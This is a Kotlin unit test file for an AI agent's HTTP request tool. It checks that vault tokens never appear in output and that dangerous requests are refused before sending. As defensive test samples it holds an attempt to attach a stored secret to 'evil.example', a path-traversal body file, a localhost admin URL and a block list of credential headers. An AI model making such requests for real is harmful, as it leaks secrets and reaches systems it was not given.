package com.example.notes

import org.json.JSONObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.io.File

/**
 * `http` — **one request to anywhere, with the verb the caller chose.**
 *
 * This is the tool that replaces a typed method per service: `gh`, `createRepo`, `dispatch`, and the
 * four `REPOSITORY:` bindings that had to be kept in step. The tests below are therefore about the
 * four things that make that safe rather than about any particular API.
 *
 * **The one that must never be deleted is [the vault's value never appears anywhere].** Everything
 * else is a convenience; that one is the difference between an agent that can authenticate and an
 * agent that can exfiltrate a token by naming it.
 */
class HttpToolTest {

    @get:Rule
    val temp = TemporaryFolder()

    private lateinit var project: File
    private lateinit var ws: Workspace
    private lateinit var git: ProjectGit
    private lateinit var log: AgentLog

    /** What the fake was asked, so a test can assert the call as well as the answer. */
    private var askedUrl: String? = null
    private var askedMethod: String? = null
    private var askedHeaders: Map<String, String> = emptyMap()
    private var askedBody: ByteArray? = null

    /** What the fake answers with, per test. */
    private var status = 200
    private var answer = "{\"login\":\"someone\"}".toByteArray()
    private var extraHeaders: Map<String, String> = emptyMap()
    private var fail: String? = null

    private val credentials = MemoryCredentials().apply { activeLogin = "someone" }

    private fun fetcher() = object : Fetcher {
        override fun bytes(url: String, limitBytes: Long): Result<ByteArray> {
            askedUrl = url
            return Result.success(answer)
        }

        override fun request(
            url: String,
            method: String,
            headers: Map<String, String>,
            body: ByteArray?,
            limitBytes: Long,
        ): Result<Fetcher.Answer> {
            askedUrl = url
            askedMethod = method
            askedHeaders = headers
            askedBody = body
            fail?.let { return Result.failure(IllegalStateException(it)) }
            return Result.success(Fetcher.Answer(status, extraHeaders, answer))
        }
    }

    @Before
    fun setUp() {
        ws = Workspace(temp.root)
        project = ws.projectDir("shopping")
        project.mkdirs()
        git = ProjectGit(ws, { null }, { GitAuthor("Muffy", "muffy@example.com") })
        File(project, "milk.txt").writeText("two litres")
        log = AgentLog.open(project)
    }

    private fun tools(httpAllowed: Boolean = true) = AgentTools(
        ws, "shopping", git, log,
        credentials = credentials,
        fetcher = fetcher(),
        privateAllowed = { false },
        httpAllowed = { httpAllowed },
    )

    private fun call(tool: String, args: String) =
        tools().run(Call(id = "c-$tool", tool = tool, args = args))

    private fun args(vararg pairs: Pair<String, Any>) =
        JSONObject(mapOf(*pairs)).toString()

    // ---- what it sends -----------------------------------------------------

    /**
     * **The verb the caller asked for, and the body it gave.** This is the whole reason the tool
     * exists: without it the app can only make GETs, and every API's write endpoints are unreachable.
     */
    @Test
    fun `the method and body are the caller's, not the app's`() {
        val said = call("http", """{"method":"POST","url":"https://api.example.com/x","body":"{\"a\":1}"}""")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertEquals("POST", askedMethod)
        assertEquals("""{"a":1}""", String(askedBody!!, Charsets.UTF_8))
    }

    /** A GET with no method given is a GET, because that is what a person means by "fetch this". */
    @Test
    fun `a request with no method is a GET`() {
        call("http", """{"url":"https://api.example.com/x"}""")
        assertEquals("GET", askedMethod)
    }

    /**
     * **A body on a GET is refused rather than silently dropped.** `HttpURLConnection` would send the
     * request without it and the caller would read an answer to a question it did not ask.
     */
    @Test
    fun `a GET with a body is refused and says which verb to use`() {
        val said = call("http", """{"url":"https://api.example.com/x","body":"hello"}""")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("POST"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** A verb the app cannot send is refused with the list, not by the connection with a stack trace. */
    @Test
    fun `an unknown method is refused with the ones that work`() {
        val said = call("http", """{"method":"TRACE","url":"https://api.example.com/x"}""")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("PATCH"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** `@path` posts a file, which is how a picture or a payload that will not fit in a string goes. */
    @Test
    fun `a body of at-path posts the file`() {
        File(project, "payload.json").writeText("{\"from\":\"a file\"}")

        val said = call("http", """{"method":"POST","url":"https://api.example.com/x","body":"@payload.json"}""")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertEquals("{\"from\":\"a file\"}", String(askedBody!!, Charsets.UTF_8))
    }

    /**
     * **A body file outside the project is refused.** A body is read and then sent to a server, so
     * `@../other-project/notes.md` must not resolve — the same rule `read` follows, applied to the
     * one tool that sends what it reads somewhere else.
     */
    @Test
    fun `a body file outside the project is refused`() {
        val said = call("http", """{"method":"POST","url":"https://api.example.com/x","body":"@../elsewhere.md"}""")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("outside this project"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    // ---- the vault ---------------------------------------------------------

    /**
     * **THE TEST THAT MUST NEVER BE DELETED.** A named secret is attached as a Bearer token, and its
     * value appears nowhere: not in the answer, not in the headers the caller set, not in the trace.
     *
     * A tool that echoed the token back would put it in the conversation and in the request log, which
     * is the one failure the vault exists to prevent — and it would look like a helpful diagnostic
     * while doing it.
     */
    @Test
    fun `the vault's value never appears anywhere`() {
        credentials.setSecret("github", "ghp_the_real_token", "api.example.com")

        val said = call("http", """{"url":"https://api.example.com/user","auth":"github"}""")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertEquals("it was attached", "Bearer ghp_the_real_token", askedHeaders["Authorization"])
        assertFalse(
            "the token is in the answer, which puts it in the conversation: $said",
            said.contains("ghp_the_real_token"),
        )
    }

    /**
     * **A secret is refused for a host it was not stored for, and the refusal names the host.**
     *
     * This is the hole that `auth:` would otherwise open: without it the agent names the secret and
     * chooses the destination, which is exfiltration rather than authentication. The sentence matters
     * as much as the refusal — "401" would send the model to retry the same thing.
     */
    @Test
    fun `a secret is refused for a host it is not for, and the refusal says so`() {
        credentials.setSecret("github", "ghp_the_real_token", "api.github.com")

        val said = call("http", """{"url":"https://evil.example/x","auth":"github"}""")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("it names the host it was asked for: $said", said.contains("evil.example"))
        assertTrue("and where the secret really is: $said", said.contains("api.github.com"))
        assertEquals("and nothing was sent", null, askedMethod)
    }

    /** A name that is not in the vault is refused with the names that are, so the model can correct itself. */
    @Test
    fun `an unknown secret is refused with the real names`() {
        credentials.setSecret("github", "ghp_one", "api.github.com")
        credentials.setSecret("linear", "lin_two", "mcp.linear.app")

        val said = call("http", """{"url":"https://api.github.com/user","auth":"gitlab"}""")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("\"github\""))
        assertTrue(said, said.contains("\"linear\""))
        assertFalse("and never a value: $said", said.contains("ghp_one"))
    }

    /**
     * **The agent may not write an authorization header.** If it could, the vault would be decorative:
     * a token in the conversation is a token in the log, and the store's whole purpose is that the
     * value never travels through text.
     */
    @Test
    fun `a hand-written authorization header is refused, and names auth instead`() {
        val said = call(
            "http",
            """{"url":"https://api.example.com/x","headers":{"Authorization":"Bearer ghp_typed"}}""",
        )

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("it says what to do instead: $said", said.contains("\"auth\""))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** The same rule for the other three ways a credential travels. */
    @Test
    fun `cookie, proxy-authorization and x-api-key are refused too`() {
        for (header in listOf("Cookie", "Proxy-Authorization", "X-Api-Key")) {
            val said = call(
                "http",
                """{"url":"https://api.example.com/x","headers":{"$header":"secret"}}""",
            )
            assertTrue("$header: $said", said.startsWith(AgentLog.FAILURE))
            assertEquals("$header sent nothing", null, askedMethod)
        }
    }

    /** Any other header is the caller's, because an API may require one and only four carry secrets. */
    @Test
    fun `an ordinary header is sent`() {
        call(
            "http",
            """{"url":"https://api.example.com/x","headers":{"X-GitHub-Api-Version":"2022-11-28"}}""",
        )
        assertEquals("2022-11-28", askedHeaders["X-GitHub-Api-Version"])
    }

    // ---- the answer --------------------------------------------------------

    /**
     * **A 4xx is not a failure of the tool.** An API's vocabulary is statuses, and the body is the
     * diagnostic — "which field was wrong" is in it. Reporting "done" for a 422 would teach the model
     * to stop checking.
     */
    @Test
    fun `a 422 is reported with its number and its body`() {
        status = 422
        answer = """{"message":"Validation Failed","errors":[{"field":"name"}]}""".toByteArray()

        val said = call("http", """{"method":"POST","url":"https://api.example.com/x","body":"{}"}""")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("the number is there: $said", said.contains("422"))
        assertTrue("and the reason: $said", said.contains("Validation Failed"))
    }

    /** A 204 has no body, and that is not a failure — the status says the thing was done. */
    @Test
    fun `a 204 with nothing in it is a success`() {
        status = 204
        answer = ByteArray(0)

        val said = call("http", """{"method":"DELETE","url":"https://api.example.com/x"}""")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertTrue(said, said.contains("204"))
    }

    /**
     * **The body is always filed, and the path is named.** The conversation gets the answer when it is
     * small enough to read and the file otherwise — the same protocol as `runs` and `shot`, because the
     * destination differs so the result-size rule does not apply.
     */
    @Test
    fun `the answer is filed under agent http and the path is said`() {
        val said = call("http", """{"url":"https://api.example.com/user"}""")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertTrue("it says where: $said", said.contains("agent/http/"))
        val dir = File(project, Fetched.HTTP_DIR)
        assertTrue("the folder was made", dir.isDirectory)
        val files = dir.listFiles().orEmpty()
        assertEquals("one file", 1, files.size)
        assertEquals("holding the body", "{\"login\":\"someone\"}", files[0].readText())
    }

    /**
     * **Two POSTs to one endpoint do not overwrite each other.** The name is hashed from the method
     * and the body, so a model comparing two answers is reading two files rather than the same one
     * twice — which is a bug that would look like the server ignoring the second request.
     */
    @Test
    fun `two posts to one url are two files`() {
        call("http", """{"method":"POST","url":"https://api.example.com/x","body":"{\"a\":1}"}""")
        call("http", """{"method":"POST","url":"https://api.example.com/x","body":"{\"a\":2}"}""")

        assertEquals("two answers, kept apart", 2, File(project, Fetched.HTTP_DIR).listFiles().orEmpty().size)
    }

    /** A binary answer is filed and **not** quoted, because bytes in the conversation cost the budget to say nothing. */
    @Test
    fun `a binary answer is filed and not quoted`() {
        answer = byteArrayOf(0x89.toByte(), 0x50, 0x4E, 0x47, 0, 0, 0, 0)

        val said = call("http", """{"url":"https://api.example.com/picture.png"}""")

        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
        assertTrue("it says it was filed: $said", said.contains("filed, not quoted"))
    }

    /** A redirect on a POST is **returned**, not followed: following it would silently lose the body. */
    @Test
    fun `a redirect on a post is returned with where it points`() {
        status = 301
        extraHeaders = mapOf("Location" to "https://api.example.com/elsewhere")

        val said = call("http", """{"method":"POST","url":"https://api.example.com/x","body":"{}"}""")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("301"))
        assertTrue("and where: $said", said.contains("https://api.example.com/elsewhere"))
    }

    /** The rate-limit headers are quoted when present, so a caller can wait instead of retrying into a wall. */
    @Test
    fun `a nearly-spent rate limit is said`() {
        extraHeaders = mapOf("X-RateLimit-Remaining" to "2", "X-RateLimit-Reset" to "1700000000")

        val said = call("http", """{"url":"https://api.example.com/user"}""")

        assertTrue(said, said.contains("2 requests remain"))
        assertTrue(said, said.contains("1700000000"))
    }

    // ---- refusals that come before anything is sent ------------------------

    /** A missing url is refused with the shape to use, not with a stack trace. */
    @Test
    fun `no url is refused`() {
        val said = call("http", "{}")
        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue("it names the argument to give: $said", said.contains("url"))
    }

    /** The address rule runs before the request, because the request is the harm. */
    @Test
    fun `a private address is refused before anything is opened`() {
        val said = call("http", """{"url":"http://127.0.0.1/admin"}""")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** The switch that turns downloading off turns this off too, and the refusal says where to change it. */
    @Test
    fun `the network switch turns http off as well as fetch`() {
        val said = AgentTools(
            ws, "shopping", git, log,
            credentials = credentials,
            fetcher = fetcher(),
            httpAllowed = { false },
        ).run(Call(id = "c-http", tool = "http", args = """{"url":"https://api.example.com/x"}"""))

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("switched off"))
        assertEquals("nothing was sent", null, askedMethod)
    }

    /** A connection that never answered says so in the fetcher's own words rather than a stack trace. */
    @Test
    fun `a request that fails says why`() {
        fail = "The request failed: no route to host"

        val said = call("http", """{"url":"https://api.example.com/x"}""")

        assertTrue(said, said.startsWith(AgentLog.FAILURE))
        assertTrue(said, said.contains("no route to host"))
    }

    /** It files an answer, so the folder listing must move — the same bug `write` had. */
    @Test
    fun `http is in the set that changes the folder`() {
        assertTrue("http files a body", "http" in AgentTools.CHANGES_DISK)
    }
}
